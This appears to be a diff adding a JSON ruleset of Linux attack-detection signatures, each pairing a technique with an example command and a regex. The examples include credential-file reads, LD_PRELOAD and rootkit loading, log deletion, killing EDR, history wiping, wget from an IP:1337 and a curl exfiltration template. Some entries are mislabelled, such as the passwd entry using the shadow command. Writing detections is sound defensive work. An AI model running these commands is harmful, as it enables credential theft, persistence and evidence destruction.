@@ -1,0 +1,254 @@
+{
+  "activities": [
+    {
+      "system_activity": "ARP",
+      "attack_technique": "REMOTE SYSTEM DISCOVERY",
+      "Level": "Medium",
+      "attack_signature": {
+        "process": "/usr/sbin/arp",
+        "condition": "arp -a",
+        "regex": "arp\\ -a"
+      }
+    },
+    {
+      "system_activity": "USERS",
+      "attack_technique": "SYSTEM OWNER/USER DISCOVERY",
+      "Level": "Medium",
+      "attack_signature": {
+        "process": "/usr/bin/users",
+        "condition": "users",
+        "regex": "users"
+      }
+    },
+    {
+      "system_activity": "NETSTAT",
+      "attack_technique": "NETWORK CONNECTIONS DISCOVERY",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/bin/netstat",
+        "condition": "netstat -plntu",
+        "regex": "netstat\\ -plntu"
+      }
+    },
+    {
+      "system_activity": "UNAME",
+      "attack_technique": "LIST OS INFORMATION",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/bin/uname",
+        "condition": "uname -a",
+        "regex": "uname\\ -a"
+      }
+    },
+    {
+      "system_activity": "GROUPS",
+      "attack_technique": "ENUMERATE USERS AND GROUPS",
+      "Level": "Medium",
+      "attack_signature": {
+        "process": "/usr/bin/groups",
+        "condition": "groups",
+        "regex": "groups"
+      }
+    },
+    {
+      "system_activity": "TCPDUMP",
+      "attack_technique": "PACKET CAPTURE LINUX",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/usr/sbin/tcpdump",
+        "condition": "tcpdump -n > output",
+        "regex": "tcpdump\\ -n\\ >\\ output"
+      }
+    },
+    {
+      "system_activity": "LD_PRELOAD",
+      "attack_technique": "SHARED LIBRARY INJECTION VIA LD_PRELOAD",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/ls",
+        "condition": "LD_PRELOAD=/tmp/wgs.so /bin/ls",
+        "regex": "LD_PRELOAD=/tmp/wgs\\.so\\ /bin/ls"
+      }
+    },
+    {
+      "system_activity": "INSMOD",
+      "attack_technique": "LOADABLE KERNEL MODULE BASED ROOTKIT",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/sbin/insmod",
+        "condition": "insmod rootkit.ko",
+        "regex": "insmod\\ rootkit\\.ko"
+      }
+    },
+    {
+      "system_activity": "MODPROBE",
+      "attack_technique": "LOADABLE KERNEL MODULE BASED ROOTKIT",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/sbin/modprobe",
+        "condition": "modprobe -r rootkit.ko",
+        "regex": "modprobe\\ -r\\ rootkit\\.ko"
+      }
+    },
+    {
+      "system_activity": "USERADD",
+      "attack_technique": "CREATE A USER ACCOUNT",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/usr/sbin/useradd",
+        "condition": "useradd -g 500 -u 500 -s /usr/local/bin/nocando -d /var/spool/vmail",
+        "regex": "useradd\\ -g\\ 500\\ -u\\ 500\\ -s\\ /usr/local/bin/nocando\\ -d\\ /var/spool/vmail"
+      }
+    },
+    {
+      "system_activity": "CRONTAB",
+      "attack_technique": "SCHEDULE TASK/JOB USING CRON",
+      "Level": "Medium",
+      "attack_signature": {
+        "process": "/usr/bin/crontab",
+        "condition": "crontab -r",
+        "regex": "crontab\\ -r"
+      }
+    },
+    {
+      "system_activity": "RM",
+      "attack_technique": "DELETE FILE SYSTEM OR LOG FILES",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/rm",
+        "condition": "rm -rf /var/logs",
+        "regex": "rm\\ -rf\\ /var/logs"
+      }
+    },
+    {
+      "system_activity": "KILL/PKILL",
+      "attack_technique": "KILL EDR PROCESSES",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/kill",
+        "condition": "kill -9 1234",
+        "regex": "kill\\ -9\\ 1234"
+      }
+    },
+    {
+      "system_activity": "LSMOD",
+      "attack_technique": "LINUX VM CHECK VIA KERNEL MODULES",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/sbin/insmod",
+        "condition": "grep -i vboxguest",
+        "regex": "grep\\ -i\\ vboxguest"
+      }
+    },
+    {
+      "system_activity": "SYSTEMCTL",
+      "attack_technique": "STOP EDR SERVICES ON LINUX",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/usr/bin/systemctl",
+        "condition": "systemctl stop daemon",
+        "regex": "systemctl\\ stop\\ daemon"
+      }
+    },
+    {
+      "system_activity": "CURL",
+      "attack_technique": "MALICIOUS USER AGENTS",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/usr/bin/curl",
+        "condition": "curl -XPOST {base64_data} -H {destination_url}",
+        "regex": "curl\\ -XPOST\\ \\{base64_data\\}\\ -H"
+      }
+    },
+    {
+      "system_activity": "WGET",
+      "attack_technique": "INGRESS TOOL TRANSFER",
+      "Level": "Medium",
+      "attack_signature": {
+        "process": "/usr/bin/wget",
+        "condition": "wget http://IP:1337/file.sh",
+        "regex": "wget\\ http:\\/\\/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:1337\\/file\\.sh"
+      }
+    },
+    {
+      "system_activity": "CHATTR",
+      "attack_technique": "FILE ATTRIBUTES/PERMISSIONS MODIFICATION",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/usr/bin/chattr",
+        "condition": "chattr -i /etc/ld.so.preload",
+        "regex": "chattr\\ -i\\ /etc/ld\\.so\\.preload"
+      }
+    },
+    {
+      "system_activity": "/ETC/SHADOW (LOCAL)",
+      "attack_technique": "ACCESS /ETC/SHADOW (LOCAL)",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/cat",
+        "condition": "cat /etc/shadow > file",
+        "regex": "cat\\ /etc/shadow\\ >\\ file"
+      }
+    },
+    {
+      "system_activity": "/ETC/PASSWD (LOCAL) ENUMERATE ALL ACCOUNTS",
+      "attack_technique": "PROCESS",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/cat",
+        "condition": "cat /etc/shadow > file",
+        "regex": "cat\\ /etc/passwd\\ >\\ file"
+      }
+    },
+    {
+      "system_activity": "~/.bash_history",
+      "attack_technique": "ACCESS /ETC/PASSWD (LOCAL) ENUMERATE ALL ACCOUNTS",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/echo",
+        "condition": "echo \"\\\"\" > ~/.bash_history",
+        "regex": "echo\\ \"\\\\\"\"\\ >\\ \\~/.bash_history"
+      }
+    },
+    {
+      "system_activity": "/ETC/SUDOERS",
+      "attack_technique": "VIEW SUDOERS ACCESS",
+      "Level": "Low",
+      "attack_signature": {
+        "process": "/usr/bin/vim",
+        "condition": "/etc/sudoers",
+        "regex": "/etc/sudoers"
+      }
+    },
+    {
+      "system_activity": "~/.BASH_PROFILE",
+      "attack_technique": "~/.BASH_PROFILE",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/echo",
+        "condition": "echo \"/tmp/qwer\" >> ~/.bash_profile",
+        "regex": "echo\\ \"/tmp/qwer\"\\ \\>\\>\\ \\~/.bash_profile"
+      }
+    },
+    {
+      "system_activity": "~/.BASH_RC",
+      "attack_technique": "~/.BASH_RC",
+      "Level": "High",
+      "attack_signature": {
+        "process": "/bin/echo",
+        "condition": "echo \"/tmp/qwer\" >> ~/.bash_RC",
+        "regex": "echo\\ \"/tmp/qwer\"\\ \\>\\>\\ \\~/.bash_RC"
+      }
+    },
+    {
+      "system_activity": "/ETC/LD.SO.\nPRELOAD",
+      "attack_technique": "HIJACK EXECUTION FLOW",
+      "Level": "Medium",
+      "attack_signature": {
+        "process": "/bin/echo",
+        "condition": "echo \"/tmp/a.so\" >> /etc/ld.so.preload",
+        "regex": "echo\\ \"/tmp/a\\.so\"\\ \\>\\>\\ /etc/ld\\.so\\.preload"
+      }
+    }
+  ]
+}
